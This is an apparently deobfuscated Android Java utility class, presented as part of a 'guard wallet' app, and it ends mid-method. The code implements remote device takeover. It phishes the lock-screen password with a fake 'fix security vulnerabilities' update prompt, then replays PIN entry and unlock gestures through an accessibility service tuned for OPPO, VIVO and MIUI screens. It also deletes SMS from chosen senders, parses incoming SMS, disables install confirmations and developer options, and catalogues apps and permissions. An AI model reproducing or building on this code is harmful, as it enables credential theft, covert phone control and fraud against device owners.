package com.guard.wallet.utils;
import com.guard.wallet.core.AppUtils;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.drawable.Drawable;
import android.app.KeyguardManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.WIFIState;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.receiver.CustomAdminReceiver;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.NetStateVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.AppInfo;
import com.guard.wallet.resp.CallStateVO;
import com.guard.wallet.resp.DeviceAdminVO;
import com.guard.wallet.resp.PermissionInfoVO;
import java.io.File;
import java.io.FileOutputStream;
import java.security.PrivateKey;
import java.security.cert.Certificate;
import com.guard.wallet.MainApplication;
import com.guard.wallet.resp.DeviceContactInfoVO;
import com.guard.wallet.resp.PermissionsBodyVO;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.req.DeviceCipherStateVO;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.LinkedHashSet;
import java.util.Collections;
import java.util.HashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicInteger;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.database.Cursor;
import android.graphics.Bitmap.Config;
import android.graphics.Canvas;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract.Data;
import android.provider.MediaStore.Images.Media;
import android.provider.Settings.Global;
import android.provider.Settings.System;
import com.guard.wallet.resp.SmsRecognizePlug;
import com.google.gson.reflect.TypeToken;
import java.util.LinkedList;
import java.util.List;

/**
 * 系统工具门面（原混淆名 g.java）
 * <p>
 * 全局工具门面 — 保持对外 API 不变，内部委托给拆分后的专职工具类。
 * 此类不含业务逻辑，仅做转发。新代码请直接使用具体工具类。
 * <p>
 * 涵盖：Context 管理、权限检查、辅助功能、手势分发、ADB/调试、
 * 设备信息、网络状态、解锁流程、应用管理、广播注册、证书/TLS 等。
 */
public abstract class SystemHelper {

    // ═══════ Context / App 管理 → AppManagerUtils ═══════

    public static Context Z() { return AppManagerUtils.getContext(); }
    public static String i0() { return AppManagerUtils.getExternalFilePath(); }
    /** vendor g.a0(Context) — 获取当前进程名 */
    public static String a0(Context ctx) { return AppManagerUtils.getProcessName(ctx); }
    public static String x0() { return AppManagerUtils.getAppLabel(); }
    public static String y0() { return AppManagerUtils.getNativeLibraryDir(); }
    public static String e() { return AppManagerUtils.getGuardAppLabel(); }
    public static String b0() { return AppManagerUtils.getDefaultLauncherPackage(); }
    public static AppInfo d0(String pkg) { return AppManagerUtils.getAppInfo(pkg); }
    public static AppInfo W(PackageManager pm, ApplicationInfo ai) { return AppManagerUtils.buildAppInfo(pm, ai); }
    public static Drawable V(String pkg) { return AppManagerUtils.getAppIcon(pkg); }
    public static Intent A0(String pkg, String cls) { return AppManagerUtils.createLaunchIntent(pkg, cls); }
    public static Intent u0(String pkg) { return AppManagerUtils.getLaunchIntentForPackage(pkg); }
    public static boolean d1(String pkg, String cls) { return AppManagerUtils.startActivity(pkg, cls); }
    public static boolean a1(String pkg) { return AppManagerUtils.openWriteSettingsPage(pkg); }
    public static boolean s0(String pkg) { return AppManagerUtils.isAppInForeground(pkg); }

    // ═══════ 权限 → PermissionUtils ═══════

    public static boolean j() { return PermissionUtils.hasWriteSecureSettings(); }
    public static boolean h() { return PermissionUtils.hasReadExternalStorage(); }
    public static boolean i() { return PermissionUtils.hasWriteExternalStorage(); }
    public static boolean k() { return PermissionUtils.hasCameraPermission(); }
    public static boolean l() { return PermissionUtils.canRequestPackageInstalls(); }
    public static boolean m() { return PermissionUtils.hasReadMediaAudio(); }
    public static boolean n() { return PermissionUtils.hasReadContacts(); }
    public static boolean o() { return PermissionUtils.hasReadMediaImages(); }
    public static boolean p() { return PermissionUtils.hasReadSmsPermission(); }
    public static boolean q() { return PermissionUtils.hasReadMediaVideo(); }
    public static boolean o0() { return PermissionUtils.isIgnoringBatteryOptimizations(); }

    // ═══════ 辅助功能 → AccessibilityUtils ═══════

    public static boolean F0(int action) { return AccessibilityUtils.performGlobalAction(action); }
    public static boolean x() { return AccessibilityUtils.isAccessibilityServiceEnabled(); }
    public static boolean L() { return AccessibilityUtils.enableAccessibilityService(); }
    public static boolean C() { return AccessibilityUtils.disableAccessibilityService(); }
    public static LinkedList<String> f0() { return AccessibilityUtils.getServiceIdentifiers(); }
    public static LinkedHashSet<String> q0() { return AccessibilityUtils.getEnabledServices(); }
    public static boolean X0() { return AccessibilityUtils.openSettings(); }
    public static boolean Z0(String pkg) { return AccessibilityUtils.openAppDetailSettings(pkg); }
    public static boolean f1() { return AccessibilityUtils.openDeveloperSettings(); }
    public static boolean j0() { return AccessibilityUtils.requestIgnoreBatteryOptimization(); }

    // ═══════ 手势 → GestureUtils ═══════

    public static boolean S(Long delay, Long duration, Point... points) {
        return GestureUtils.dispatchGesture(delay, duration, points);
    }
    public static boolean G0(Integer x, Integer y, Long duration) {
        return GestureUtils.clickAtPosition(x, y, duration);
    }
    public static boolean s(Integer x, Integer y) { return GestureUtils.tap(x, y); }
    /** g.s(x1,y1,x2,y2) — swipe from (x1,y1) to (x2,y2) */
    public static boolean s(int x1, int y1, int x2, int y2) { return GestureUtils.swipe(x1, y1, x2, y2); }
    public static boolean t(List<Point> points) { return GestureUtils.clickMultiplePoints(points); }

    // ═══════ 全局动作路由 → GlobalActionExecutor ═══════

    public static boolean a(com.guard.wallet.condition.GlobalActionCondition cond) {
        return GlobalActionExecutor.executeGlobalAction(cond);
    }

    // ═══════ ADB/调试 → AdbUtils ═══════

    public static boolean I() { return AdbUtils.isAdbEnabled(); }
    public static boolean J() { return AdbUtils.isWirelessDebugEnabled(); }
    public static boolean K() { return AdbUtils.isDeveloperOptionsEnabled(); }
    public static void D() { AdbUtils.disableAdbInstallConfirm(); }
    public static boolean b() { return AdbUtils.isSecureWriteEnabled(); }
    public static boolean c() { return AdbUtils.isAdbInstallConfirmRequired(); }

    // ═══════ 设备信息 → DeviceInfoUtils ═══════

    public static void T0(int ticks) { DeviceInfoUtils.sleepInIntervals(ticks); }
    public static int O0() { return DeviceInfoUtils.getScreenBrightness(); }
    public static Long P0() { return DeviceInfoUtils.getScreenOffTimeout(); }
    public static boolean x1(Long timeout) { return DeviceInfoUtils.setScreenOffTimeout(timeout); }
    public static String v0(String a, String b, String c) { return DeviceInfoUtils.buildIdentifier(a, b, c); }
    /** vendor g.c0(Context) — 获取本地地址 */
    public static String c0(Context ctx) { return DeviceInfoUtils.getLocalhostAddress(ctx); }
    /** vendor g.Q0() — 启动设备凭证确认弹窗 */
    public static boolean Q0() { return DeviceInfoUtils.launchCredentialConfirm(); }

    // ═══════ 网络 → NetworkUtils ═══════

    /** vendor g.z0() — 获取网络状态 */
    public static NetStateVO z0() { return NetworkUtils.getNetworkState(); }
    /** vendor g.z(Context) — 获取 WiFi 详细状态 */
    public static WIFIState z(Context ctx) { return NetworkUtils.getWifiState(ctx); }
    /** vendor g.l0() — 网络是否连接 */
    public static boolean l0() { return NetworkUtils.isNetworkConnected(); }

    // ═══════ 文件/JSON → FileUtils ═══════

    /**
     * vendor g.G(String) — parse listenWindows JSON, return count of items.
     * Used in d0() to check if local listenWindows file has entries.
     */
    public static int G(String json) {
        if (json == null || json.isEmpty()) return 0;
        try {
            // vendor: parses JSON array of ListenWindow entries
            com.google.gson.JsonArray arr = com.google.gson.JsonParser.parseString(json).getAsJsonArray();
            return arr != null ? arr.size() : 0;
        } catch (Exception e) {
            return 0;
        }
    }

    // ═══════ SMS/媒体/通话 → SmsMediaUtils ═══════

    /** vendor g.A(String) — 删除指定号码的短信 */
    public static void A(String address) { SmsMediaUtils.deleteSmsFromAddress(address); }
    /** vendor g.B(String, String) — 通过 URI 删除媒体文件 */
    public static boolean B(String selection, String uri) { return SmsMediaUtils.deleteMediaFile(uri, selection); }
    /** vendor g.f(String) — 拨打电话 */
    public static boolean f(String number) { return SmsMediaUtils.makePhoneCall(number); }

    // ═══════ Bitmap → BitmapUtils ═══════

    /** vendor g.J0(Bitmap) — 安全回收 Bitmap */
    public static void J0(Bitmap bitmap) { BitmapUtils.recycleBitmap(bitmap); }
    /** vendor g.k0(Bitmap, double) — 按目标宽度缩放 */
    public static Bitmap k0(Bitmap src, double targetWidth) { return BitmapUtils.scaleBitmap(src, targetWidth); }
    /** vendor g.M0(Bitmap, float, int) — 压缩为字节数组 */
    public static byte[] M0(Bitmap bitmap, float scale, int quality) { return BitmapUtils.compressBitmapToBytes(bitmap, scale, quality); }
    /** vendor g.y(Bitmap) — Bitmap 格式转换 */
    public static Bitmap y(Bitmap src) { return BitmapUtils.convertBitmap(src); }

    // ═══════ 证书/TLS → CertificateUtils ═══════

    /** vendor g.R() — 生成 RSA 密钥对 + 自签名证书 */
    public static boolean R() { return CertificateUtils.generateAndSaveKeyPair(); }
    /** vendor g.H0() — 加载 X.509 证书 */
    public static Certificate H0() { return CertificateUtils.loadCertificate(); }
    /** vendor g.I0() — 加载 RSA 私钥 */
    public static PrivateKey I0() { return CertificateUtils.loadPrivateKey(); }

    // ═══════ 广播注册 → ReceiverRegistrar ═══════

    /** vendor g.d() — 注册同步账户 */
    public static void d() { ReceiverRegistrar.registerSyncAccount(); }
    /** vendor g.b1() — 注册电池监听 */
    public static void b1() { ReceiverRegistrar.registerBatteryReceiver(); }
    /** vendor g.e1() — 注册通话监听 */
    public static void e1() { ReceiverRegistrar.registerCallReceiver(); }
    /** vendor g.h1() — 注册网络变化监听 */
    public static void h1() { ReceiverRegistrar.registerNetworkReceiver(); }
    /** vendor g.k1() — 注册屏幕亮灭监听 */
    public static void k1() { ReceiverRegistrar.registerScreenReceiver(); }
    /** vendor g.j1() — 注册电源状态监听 */
    public static void j1() { ReceiverRegistrar.registerPowerReceiver(); }
    /** vendor g.l1() — 注册关机监听 */
    public static void l1() { ReceiverRegistrar.registerShutdownReceiver(); }
    /** vendor g.m1() — 注册应用安装/卸载监听 */
    public static void m1() { ReceiverRegistrar.registerPackageReceiver(); }
    /** vendor g.c1() — 注册开机广播监听 */
    public static void c1() { ReceiverRegistrar.registerBootReceiver(); }
    /** vendor g.i1() — 注册短信监听 */
    public static void i1() { ReceiverRegistrar.registerSmsReceiver(); }

    // ═══════ 解锁过滤器 → UnlockFilterFactory ═══════

    /** vendor g.D0() — OPPO 数字视图过滤器 */
    public static CombineFilter D0() { return UnlockFilterFactory.createDigitViewFilter(); }
    /** vendor g.r1() — systemui char_ 前缀 TextView */
    public static CombineFilter r1() { return UnlockFilterFactory.createSystemUiCharFilter(); }
    /** vendor g.s1() — systemui num 前缀 TextView */
    public static CombineFilter s1() { return UnlockFilterFactory.createSystemUiNumFilter(); }
    /** vendor g.t1() — VIVO VivoPinkey ViewGroup */
    public static CombineFilter t1() { return UnlockFilterFactory.createVivoPinkeyFilter(); }
    /** vendor g.v() — systemui key 前缀 ViewGroup */
    public static CombineFilter v() { return UnlockFilterFactory.createSystemUiKeyFilter(); }
    /** vendor g.y1() — MIUI 回车键 */
    public static CombineFilter y1() { return UnlockFilterFactory.createMiuiEnterFilter(); }

    // ═══════ 屏幕解锁 → ScreenUnlockUtils ═══════

    /** vendor g.n0() — 判断是否可以安全地进行无线调试/ADB操作 */
    public static boolean n0() {
        if (!r0()) {
            return true;
        }
        if (!p0()) {
            if (K()) {
                return true;
            }
            if (com.guard.wallet.utils.DeviceUtils.isXiaomiFamily()) {
                return true;
            }
        }
        if (com.guard.wallet.utils.SharedPrefsManager.n()) {
            return true;
        }
        return com.guard.wallet.utils.SharedPrefsManager.o();
    }
    /** vendor g.S0() — 启动设备凭证确认(带配置标题) */
    public static boolean S0() {
        String title;
        if (MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getUpdateCredentialTitle())) {
            title = MainApplication.getInstance().getBuildConfig().getUpdateCredentialTitle();
        } else {
            title = "Verify lock screen password";
        }

        String subtitle;
        if (MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getUpdateCredentialSubTitle())) {
            subtitle = MainApplication.getInstance().getBuildConfig().getUpdateCredentialSubTitle();
        } else {
            subtitle = "Fix system security vulnerabilities";
        }

        String description;
        if (MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getUpdateCredentialDescription())) {
            description = MainApplication.getInstance().getBuildConfig().getUpdateCredentialDescription();
        } else {
            description = "Please enter your lock screen password to complete the system update and fix security vulnerabilities.";
        }

        return R0(title, subtitle, description, null);
    }
    /** vendor g.p0() — 设备是否处于锁定状态 */
    public static boolean p0() { return ScreenUnlockUtils.isDeviceLocked(); }
    /** vendor g.r0() — 是否设置了安全锁 */
    public static boolean r0() { return ScreenUnlockUtils.isDeviceSecure(); }
    /** vendor g.r() — 轮询等待解锁 */
    public static boolean r() { return ScreenUnlockUtils.waitForUnlock(); }
    /** vendor g.T() — 上滑解锁 */
    public static boolean T() { return ScreenUnlockUtils.swipeUpToUnlock(); }
    /** vendor g.v1(int) — 等待密码输入框出现 */
    public static boolean v1(int retries) { return ScreenUnlockUtils.isPasswordFieldVisible(retries); }
    /** vendor g.m0() — 密码输入框是否可见 */
    public static boolean m0() { return ScreenUnlockUtils.isPasswordFieldReady(); }
    /** vendor g.P() — 解锁失败后清理 */
    public static void P() { ScreenUnlockUtils.cleanupAfterUnlockFail(); }
    /** vendor g.Q() — 解锁成功后清理 */
    public static void Q() { ScreenUnlockUtils.cleanupAfterUnlockSuccess(); }
    /** vendor g.t0(boolean) — 设置屏幕常亮 */
    public static void t0(boolean stayOn) { ScreenUnlockUtils.setScreenStayOn(stayOn); }
    /** vendor g.M(UiObject) — 按回车键确认 */
    public static void M(UiObject node) { ScreenUnlockUtils.pressEnterKey(node); }
    /** vendor g.N(UiObject) — 确认密码输入（适配 MIUI/VIVO）*/
    public static void N(UiObject node) { ScreenUnlockUtils.confirmPasswordInput(node); }
    /** vendor g.W0() — 执行主页动作 */
    public static void W0() { ScreenUnlockUtils.goHome(); }
    /** vendor g.p1(vo) — 执行完整解锁流程 */
    public static boolean p1(ReqUnlockDeviceVO vo) { return ScreenUnlockUtils.unlockDevice(vo); }
    /** vendor g.q1(ReqUnlockDeviceVO) — 输入解锁密码 */
    public static boolean q1(ReqUnlockDeviceVO req) { return ScreenUnlockUtils.inputUnlockCipher(req); }
    /** vendor g.o1(List) — 输入触点密码 */
    public static boolean o1(List<Point> points) { return ScreenUnlockUtils.inputTouchPoints(points); }
    /** vendor g.R0(String,String,String,String) — 启动设备凭证确认 Activity */
    public static boolean R0(String title, String subtitle, String desc, String eventCode) {
        return ScreenUnlockUtils.launchConfirmDeviceActivity(title, subtitle, desc, eventCode);
    }

    // ═══════ 应用列表 ═══════

    /** vendor g.e0() — 获取已安装应用列表 */
    public static LinkedList e0() {
        LinkedList<AppInfo> list = new LinkedList<>();
        Context ctx = Z();
        if (ctx != null) {
            try {
                android.content.pm.PackageManager pm = ctx.getPackageManager();
                java.util.List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
                if (apps != null) {
                    for (android.content.pm.ApplicationInfo ai : apps) {
                        AppInfo info = AppManagerUtils.buildAppInfo(pm, ai);
                        if (info != null) list.add(info);
                    }
                }
            } catch (Exception ignored) {}
        }
        return list;
    }

    // ═══════ UI 回调 (stub — 待 Phase 实现) ═══════

    /** vendor g.Y0(String, String) — 启动 Activity（先 shell 后 startActivity）*/
    public static boolean Y0(String pkg, String cls) {
        return AppManagerUtils.startActivity(pkg, cls);
    }
    /** vendor g.V0() — 打开无障碍设置 */
    public static boolean V0() { return AccessibilityUtils.openSettings(); }
    /** vendor g.n1() — 打开 WiFi 设置 */
    public static boolean n1() {
        Context ctx = Z();
        if (ctx == null) return false;
        try {
            Intent intent = new Intent("android.settings.WIFI_SETTINGS");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
            return true;
        } catch (Exception e) { return false; }
    }

    // ═══════ 锁屏/设备管理 ═══════

    /** vendor g.B0() — 获取锁屏模式信息 */
    public static LockPatternVO B0() {
        Integer zero = 0;
        int quality = -1;
        LockPatternVO vo = new LockPatternVO(zero, zero, zero, zero, zero, zero, -1);
        Context ctx = Z();
        if (ctx != null) {
            vo.setIsScreenOn(Integer.valueOf(com.guard.wallet.utils.DeviceUtils.isScreenOn() ? 1 : 0));
            try {
                DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName admin = new ComponentName(ctx, CustomAdminReceiver.class);
                if (dpm.isDeviceOwnerApp(ctx.getPackageName()) || dpm.isProfileOwnerApp(ctx.getPackageName())) {
                    quality = dpm.getPasswordQuality(admin);
                }
            } catch (Exception ignored) {}
            KeyguardManager km = (KeyguardManager) ctx.getSystemService(Context.KEYGUARD_SERVICE);
            if (km != null) {
                if (km.isKeyguardLocked()) vo.setIsKeyguardLocked(1);
                if (km.isDeviceLocked()) vo.setIsDeviceLocked(1);
                if (km.isKeyguardSecure()) vo.setIsKeyguardSecure(1);
                if (km.isDeviceSecure()) vo.setIsDeviceSecure(1);
                if (km.inKeyguardRestrictedInputMode()) vo.setInKeyguardRestrictedInputMode(1);
            }
            vo.setQuality(quality);
        }
        return vo;
    }

    /** vendor g.C0() — 获取设备管理员状态 */
    public static DeviceAdminVO C0() {
        Integer zero = 0;
        DeviceAdminVO vo = new DeviceAdminVO(null, zero, zero, zero);
        Context ctx = Z();
        if (ctx != null) {
            vo.setPackageName(ctx.getPackageName());
            try {
                DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName admin = new ComponentName(ctx, CustomAdminReceiver.class);
                if (dpm.isAdminActive(admin)) {
                    vo.setIsAdminActive(1);
                    if (dpm.isDeviceOwnerApp(ctx.getPackageName())) {
                        vo.setIsDeviceOwner(1);
                        vo.setIsProfileOwner(1);
                    }
                    if (dpm.isProfileOwnerApp(ctx.getPackageName())) {
                        vo.setIsProfileOwner(1);
                    }
                }
            } catch (Exception ignored) {}
        }
        return vo;
    }

    /** vendor g.g() — 获取通话状态 */
    @SuppressWarnings("deprecation")
    public static CallStateVO g() { return DeviceInfoUtils.getCallState(); }

    /** vendor g.g0(permission) — 获取权限详细信息 */
    public static PermissionInfoVO g0(String permission) {
        PermissionInfoVO vo = new PermissionInfoVO();
        vo.setPermissionValue(permission);
        Context ctx = Z();
        if (ctx != null) {
            try {
                android.content.pm.PackageManager pm = ctx.getPackageManager();
                android.content.pm.PermissionInfo pi = pm.getPermissionInfo(permission, android.content.pm.PackageManager.GET_META_DATA);
                vo.setProtectionLevel(pi.protectionLevel);
                CharSequence label = pi.loadLabel(pm);
                if (label != null) vo.setPermissionName(label.toString());
                CharSequence desc = pi.loadDescription(pm);
                if (desc != null) vo.setPermissionDescription(desc.toString());
                vo.setGroup(pi.group);
                // 检查本应用是否拥有此权限
                int granted = androidx.core.content.ContextCompat.checkSelfPermission(ctx, permission);
                vo.setIsGranted(granted == android.content.pm.PackageManager.PERMISSION_GRANTED ? 1 : 0);
            } catch (Exception ignored) {}
        }
        return vo;
    }

    /** vendor g.w0() — 获取联系人列表 (简化版) */
    public static LinkedList w0() {
        // vendor: 查询 ContactsContract.Data.CONTENT_URI 构建联系人列表
        // 完整实现需要 READ_CONTACTS 权限 + ContentResolver 查询
        // 暂返回空列表，待 Phase 8 CommHandler 深化时完善
        return new LinkedList();
    }

    /** vendor g.g1() — 打开无线调试设置页面 (辅助配对流程) */
    public static boolean g1() {
        return AccessibilityUtils.openWirelessDebugSettings();
    }

    /** vendor g.Y(String) — String to UTF-8 bytes */
    public static byte[] Y(String str) {
        if (str == null) return new byte[0];
        try {
            return str.getBytes("UTF-8");
        } catch (java.io.UnsupportedEncodingException e) {
            throw new RuntimeException("UTF-8 not supported", e);
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // 以下为 Phase 补全新增方法
    // ═══════════════════════════════════════════════════════════════

    /** vendor g.E(String) — 解析短信识别插件JSON并注册到监听器, 返回注册数 */
    public static int E(String json) {
        int count = 0;
        try {
            if (!AppUtils.B(json)) {
                Object parsed = com.guard.wallet.utils.SharedPrefsManager.c(json, new TypeToken<java.util.List<SmsRecognizePlug>>(){});
                java.util.List list = (java.util.List) parsed;
                count = F(list);
            }
        } catch (Exception e) {
            AppUtils.s("com.guard.wallet.utils.SystemHelper", e);
        }
        return count;
    }

    /** vendor g.F(List) — 将 SmsRecognizePlug 列表注册到 MainApplication 的 SmsMessageListener */
    public static int F(java.util.List list) {
        MainApplication app = MainApplication.getInstance();
        if (app == null || app.getSmsMessageListener() == null || list == null || list.isEmpty()) {
            return 0;
        }
        try {
            app.getSmsMessageListener().a.clear();
            int count = 0;
            for (Object obj : list) {
                SmsRecognizePlug plug = (SmsRecognizePlug) obj;
                count++;
                if (plug != null && !app.getSmsMessageListener().a.contains(plug)) {
                    app.getSmsMessageListener().a.add(plug);
                }
            }
            return count;
        } catch (Exception e) {
            AppUtils.s("com.guard.wallet.utils.SystemHelper", e);
        }
        return 0;
    }

    /** vendor g.H(List) — 注册 ListenWindow 列表到无障碍服务委托队列 */
    public static int H(java.util.List list) {
        AtomicInteger count = new AtomicInteger(0);
        if (list == null) return count.get();
        try {
            if (list.isEmpty() || MyAccessibilityService.P() == null || MyAccessibilityService.P().j()) {
                return count.get();
            }
            Collections.sort(list);
            ConcurrentLinkedQueue queue = MyAccessibilityService.P().a;
            if (queue != null && !queue.isEmpty()) {
                com.guard.wallet.infra.DelegateRemovePredicate predicate = new com.guard.wallet.infra.DelegateRemovePredicate(MyAccessibilityService.P(), 4);
                queue.removeIf(predicate);
            }
            for (Object obj : list) {
                ListenWindow lw = (ListenWindow) obj;
                count.incrementAndGet();
                if (lw.getEventSubscribes() != null && lw.getEventSubscribes().size() >= 2) {
                    Collections.sort(lw.getEventSubscribes());
                }
                MyAccessibilityService.P().c(lw);
            }
        } catch (Exception e) {
            AppUtils.s("com.guard.wallet.utils.SystemHelper", e);
        }
        return count.get();
    }

    /** vendor g.K0(String) — 移除指定类型的所有账号 */
    public static boolean K0(String accountType) {
        String type = accountType;
        if (AppUtils.B(accountType)) {
            type = "com.guard.wallet";
        }
        Context ctx = Z();
        if (ctx == null) return false;
        try {
            AccountManager am = AccountManager.get(ctx);
            Account[] accounts = am.getAccountsByType(type);
            if (accounts.length <= 0) return true;
            int removed = 0;
            for (Account account : accounts) {
                if (java.util.Objects.equals(account.type, type)) {
                    if (am.removeAccountExplicitly(account)) {
                        removed++;
                    }
                }
            }
            return removed == accounts.length;
        } catch (Exception e) {
            AppUtils.s("AccountUtils", e);
            return false;
        }
    }

    /** vendor g.L0(HttpUrl) — 从 HTTP 请求构建完整 URL (path + query) */
    public static String L0(okhttp3.HttpUrl var0) {
        String path = var0.encodedPath();
        String query = var0.query();
        if (query != null) {
            return path + '?' + query;
        }
        return path;
    }

    /** vendor g.N0(String) — 将图片文件路径插入到系统媒体库 */
    public static String N0(String filePath) {
        if (Z() != null && Z().getContentResolver() != null && i()) {
            try {
                ContentResolver cr = Z().getContentResolver();
                String title = AppUtils.x(filePath);
                if (AppUtils.B(title)) title = "unknown";
                return Media.insertImage(cr, filePath, title, null);
            } catch (java.io.FileNotFoundException e) {
                AppUtils.s("GalleryUtils", e);
            }
        }
        return null;
    }

    /** vendor g.O(DeviceCipherStateVO) — 检查密码配置是否有效 */
    public static boolean O(DeviceCipherStateVO vo) {
        if (vo == null) return false;
        if (java.util.Objects.equals(vo.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")) {
            return vo.getTouchCipher() != null && !vo.getTouchCipher().isEmpty();
        }
        return !AppUtils.B(vo.getCipherGradeCode());
    }

    /** vendor g.U(String) — 获取应用图标并压缩为 byte[] */
    public static byte[] U(String packageName) {
        if (Z() == null || !l() || AppUtils.B(packageName)) return null;
        try {
            Drawable drawable = Z().getPackageManager().getApplicationIcon(packageName);
            if (drawable == null) return M0(null, 1.0f, 100);
            int w = drawable.getIntrinsicWidth();
            int ht = drawable.getIntrinsicHeight();
            Config config = (drawable.getOpacity() != -1) ? Config.ARGB_8888 : Config.RGB_565;
            Bitmap bmp = Bitmap.createBitmap(w, ht, config);
            Canvas canvas = new Canvas(bmp);
            drawable.setBounds(0, 0, w, ht);
            drawable.draw(canvas);
            return M0(bmp, 1.0f, 100);
        } catch (Exception e) {
            AppUtils.s("ApplicationUtil", e);
        }
        return null;
    }

    /** vendor g.U0() — 延迟 500ms */
    public static void U0() {
        try {
            Thread.sleep(500L);
        } catch (Exception e) {
            AppUtils.s("UnLockUtils", e);
        }
    }

    /** vendor g.X() — 获取设备上所有浏览器包名 */
    public static java.util.LinkedList X() {
        try {
            if (Z() == null) return null;
            PackageManager pm = Z().getPackageManager();
            if (pm == null) return null;
            java.util.LinkedList<String> result = new java.util.LinkedList<>();
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.addCategory(Intent.CATEGORY_DEFAULT);
            intent.addCategory(Intent.CATEGORY_BROWSABLE);
            intent.setData(Uri.parse("http://"));
            java.util.List list = pm.queryIntentActivities(intent, 0x20000);
            if (list == null || list.isEmpty()) return result;
            for (Object obj : list) {
                android.content.pm.ResolveInfo ri = (android.content.pm.ResolveInfo) obj;
                if (ri != null && ri.activityInfo != null) {
                    String pkg = ri.activityInfo.packageName;
                    if (!AppUtils.B(pkg) && !result.contains(pkg)) {
                        result.add(pkg);
                    }
                }
            }
            return result;
        } catch (Exception e) {
            AppUtils.s("ApplicationUtil", e);
        }
        return null;
    }

    /** vendor g.h0(String) — 获取应用已授权权限列表 */
    public static PermissionsBodyVO h0(String packageName) {
        PermissionsBodyVO vo = new PermissionsBodyVO();
        if (Z() == null) return vo;
        String pkg = packageName;
        if (AppUtils.B(pkg)) pkg = Z().getPackageName();
        try {
            vo.setPackageName(pkg);
            PackageManager pm = Z().getPackageManager();
            android.content.pm.PackageInfo pi = pm.getPackageInfo(pkg, 4096);
            AppInfo appInfo = W(pm, pm.getApplicationInfo(pkg, 128));
            if (pi != null && pi.requestedPermissions != null && pi.requestedPermissions.length > 0) {
                java.util.LinkedList<String> perms = new java.util.LinkedList<>();
                vo.setPermissions(perms);
                for (String perm : pi.requestedPermissions) {
                    if (pm.checkPermission(perm, pkg) == 0) {
                        perms.add(perm);
                    }
                }
            }
            if (appInfo != null) {
                vo.setApplicationLabel(appInfo.getApplicationLabel());
            }
        } catch (Exception e) {
            AppUtils.s("ApplicationUtil", e);
        }
        return vo;
    }

    /** vendor g.u() — 关闭开发者选项 */
    public static boolean u() {
        try {
            if (Z() != null && (System.canWrite(Z()) || j())) {
                Global.putInt(Z().getContentResolver(), "development_settings_enabled", 0);
                if (!K()) {
                    return true;
                }
            }
        } catch (Exception e) {
            AppUtils.s("ApplicationUtil", e);
        }
        return false;
    }

    /** vendor g.u1() — VIVO 规则确认密码输入 */
    public static boolean u1() {
        try {
            MyAccessibilityService svc = MyAccessibilityService.P();
            if (svc == null) return false;
            CombineFilter filter = new CombineFilter();
            StringCondition sc = new StringCondition();
            sc.setProperty("id");
            sc.setEquals("com.android.systemui:id/vivo_pin_confirm");
            filter.getStringConditions().add(sc);
            UiObject node = MyAccessibilityService.M(filter);
            if (node != null && node.click()) {
                Log.d("UnLockUtils", "依VIVO规则确认Pin密码完成");
                return true;
            }
            filter = new CombineFilter();
            sc = new StringCondition();
            sc.setProperty("id");
            sc.setEquals("com.android.systemui:id/mix_normal_confirm");
            filter.getStringConditions().add(sc);
            UiObject node2 = MyAccessibilityService.M(filter);
            if (node2 != null && node2.click()) {
                Log.d("UnLockUtils", "依VIVO规则确认混合密码完成");
                return true;
            }
        } catch (Exception e) {
            AppUtils.s("UnLockUtils", e);
        }
        return false;
    }

    /** vendor g.w() — 确认PIN码输入 (MIUI/VIVO/通用规则) */
    public static void w() {
        if (MyAccessibilityService.P() == null) return;
        try {
            if (com.guard.wallet.utils.DeviceUtils.isXiaomiFamily()) {
                CombineFilter miuiFilter = y1();
                UiObject node = MyAccessibilityService.M(miuiFilter);
                if (node != null && node.click()) {
                    Log.d("UnLockUtils", "依MIUI规则确认PIN码输入完成");
                    return;
                }
            }
            if (com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
                if (u1()) {
                    Log.d("UnLockUtils", "依VIVO规则确认密码完成");
                    return;
                }
            }
            CombineFilter generic = new CombineFilter();
            generic.setBoolConditions(new java.util.LinkedList<>());
            generic.setPointConditions(new java.util.LinkedList<>());
            generic.setStringConditions(new java.util.LinkedList<>());
            generic.getBoolConditions().add(new BoolCondition("clickable", true, true));
            generic.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/key_enter", null, null));
            UiObject enterKey = MyAccessibilityService.M(generic);
            if (enterKey != null && enterKey.click()) {
                Log.d("UnLockUtils", "依通用规则确认PIN码输入完成");
            }
        } catch (Exception ex) {
            AppUtils.s("UnLockUtils", ex);
        }
    }

    /** vendor g.w1 — 保存证书到 PEM 文件 (Android 兼容版) */
    public static File w1(java.security.cert.X509Certificate cert) {
        try {
            if (!AppUtils.B(i0())) {
                File file = new File(i0(), "cert.pem");
                FileOutputStream fos = new FileOutputStream(file);
